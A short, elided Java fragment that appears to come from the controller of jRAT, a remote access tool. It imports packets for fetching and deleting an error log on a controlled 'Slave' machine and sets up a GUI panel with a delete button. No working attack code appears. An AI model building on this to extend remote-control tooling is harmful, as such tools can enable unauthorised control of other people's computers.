...
import jrat.controller.packets.outgoing.Packet86ErrorLog;
import jrat.controller.packets.outgoing.Packet87DeleteErrorLog;
...
public class PanelControlErrorLog extends PanelControlParent {
	...
	public PanelControlErrorLog(Slave sl) {
		...
		btnDeleteErrdatFile.setIcon(Resources.getIcon("delete"));
